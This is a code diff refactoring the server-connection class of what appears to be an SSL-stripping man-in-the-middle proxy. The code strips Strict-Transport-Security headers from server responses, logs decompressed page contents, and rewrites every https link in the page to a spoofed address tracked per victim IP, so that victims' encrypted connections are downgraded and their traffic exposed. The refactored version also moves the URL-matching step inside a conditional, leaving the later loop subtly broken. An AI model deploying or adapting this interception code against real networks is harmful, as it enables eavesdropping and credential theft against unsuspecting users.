@@ -28,14 +28,13 @@ class ServerConnection(HTTPClient):
     from HTTPS to HTTP.
     '''
 
-    urlExpression     = re.compile(r"(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)", re.IGNORECASE)
-    urlType           = re.compile(r"https://", re.IGNORECASE)
-    urlTypewww           = re.compile(r"https://www", re.IGNORECASE)
-    urlwExplicitPort   = re.compile(r'https://www([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)
-    urlExplicitPort   = re.compile(r'https://([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)
-    urlToken1 		  = re.compile(r'(https://[a-zA-Z0-9./]+\?)', re.IGNORECASE)
-    urlToken2 		  = re.compile(r'(https://[a-zA-Z0-9./]+)\?{0}', re.IGNORECASE)
-#    urlToken2 		  = re.compile(r'(https://[a-zA-Z0-9.]+/?[a-zA-Z0-9.]*/?)\?{0}', re.IGNORECASE)
+    urlExpression       = re.compile(r"(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)", re.IGNORECASE)
+    urlType             = re.compile(r"https://", re.IGNORECASE)
+    urlTypewww          = re.compile(r"https://www", re.IGNORECASE)
+    urlwExplicitPort    = re.compile(r'https://www([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)
+    urlExplicitPort     = re.compile(r'https://([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)
+    urlToken1           = re.compile(r'(https://[a-zA-Z0-9./]+\?)', re.IGNORECASE)
+    urlToken2           = re.compile(r'(https://[a-zA-Z0-9./]+)\?{0}', re.IGNORECASE)
 
     def __init__(self, command, uri, postData, headers, client):
         self.command          = command
@@ -74,7 +73,7 @@ class ServerConnection(HTTPClient):
         logging.log(self.getLogLevel(), "HTTP connection made.")
         self.sendRequest()
         self.sendHeaders()
-        
+
         if (self.command == 'POST'):
             self.sendPostData()
 
@@ -101,19 +100,18 @@ class ServerConnection(HTTPClient):
             self.contentLength = value
         elif (key.lower() == 'set-cookie'):
             self.client.responseHeaders.addRawHeader(key, value)
-        elif (key.lower()== 'strict-transport-security'):
-        	logging.log(self.getLogLevel(), "LEO Erasing Strict Transport Security....")
+        elif (key.lower() == 'strict-transport-security'):
+            logging.log(self.getLogLevel(), "LEO Erasing Strict Transport Security....")
         else:
             self.client.setHeader(key, value)
-            
 
     def handleEndHeaders(self):
-       if (self.isImageRequest and self.contentLength != None):
-           self.client.setHeader("Content-Length", self.contentLength)
+        if (self.isImageRequest and self.contentLength is not None):
+            self.client.setHeader("Content-Length", self.contentLength)
 
-       if self.length == 0:
-           self.shutdown()
-                        
+        if self.length == 0:
+            self.shutdown()
+
     def handleResponsePart(self, data):
         if (self.isImageRequest):
             self.client.write(data)
@@ -130,55 +128,36 @@ class ServerConnection(HTTPClient):
         if (self.isCompressed):
             logging.debug("Decompressing content...")
             data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
-            
         logging.log(self.getLogLevel(), "Read from server:\n" + data)
-        #logging.log(self.getLogLevel(), "Read from server:\n <large data>" )
-
-
         data = self.replaceSecureLinks(data)
-
-        if (self.contentLength != None):
+        if (self.contentLength is not None):
             self.client.setHeader('Content-Length', len(data))
-        
         self.client.write(data)
         self.shutdown()
 
     def replaceSecureLinks(self, data):
-        sustitucion = {}
+        substitution = {}
         patchDict = self.urlMonitor.patchDict
-        if len(patchDict)>0:
-        	dregex = re.compile("(%s)" % "|".join(map(re.escape, patchDict.keys())))
-        	data = dregex.sub(lambda x: str(patchDict[x.string[x.start() :x.end()]]), data)
-		
-		iterator = re.finditer(ServerConnection.urlExpression, data)       
+        if len(patchDict) > 0:
+            dregex = re.compile("(%s)" % "|".join(map(re.escape, patchDict.keys())))
+            data = dregex.sub(lambda x: str(patchDict[x.string[x.start():x.end()]]), data)
+            # apply the regex to find https URLs in the page
+            iterator = re.finditer(ServerConnection.urlExpression, data)
         for match in iterator:
+            # for each match of the regexp memorize in the dictionary substituion the original url with the spoofed one
             url = match.group()
-			
             logging.debug("Found secure reference: " + url)
-            nuevaurl=self.urlMonitor.addSecureLink(self.client.getClientIP(), url)
-            logging.debug("LEO replacing %s => %s"%(url,nuevaurl))
-            sustitucion[url] = nuevaurl
-            #data.replace(url,nuevaurl)
-        
-        #data = self.urlMonitor.DataReemplazo(data)
-        if len(sustitucion)>0:
-        	dregex = re.compile("(%s)" % "|".join(map(re.escape, sustitucion.keys())))
-        	data = dregex.sub(lambda x: str(sustitucion[x.string[x.start() :x.end()]]), data)
-        
-        #logging.debug("LEO DEBUG received data:\n"+data)	
-        #data = re.sub(ServerConnection.urlExplicitPort, r'https://\1/', data)
-        #data = re.sub(ServerConnection.urlTypewww, 'http://w', data)
-        #if data.find("http://w.face")!=-1:
-        #	logging.debug("LEO DEBUG Found error in modifications")
-        #	raw_input("Press Enter to continue")
-        #return re.sub(ServerConnection.urlType, 'http://web.', data)
+            newurl = self.urlMonitor.addSecureLink(self.client.getClientIP(), url)
+            logging.debug("LEO replacing %s => %s" % (url, newurl))
+            substitution[url] = newurl
+        if len(substitution) > 0:
+            # create and apply a regexp to subtitute all the occurencies of the original url with the spoofed ones in the page
+            dregex = re.compile("(%s)" % "|".join(map(re.escape, substitution.keys())))
+            data = dregex.sub(lambda x: str(substitution[x.string[x.start():x.end()]]), data)
         return data
-
 
     def shutdown(self):
         if not self.shutdownComplete:
             self.shutdownComplete = True
             self.client.finish()
             self.transport.loseConnection()
-
-
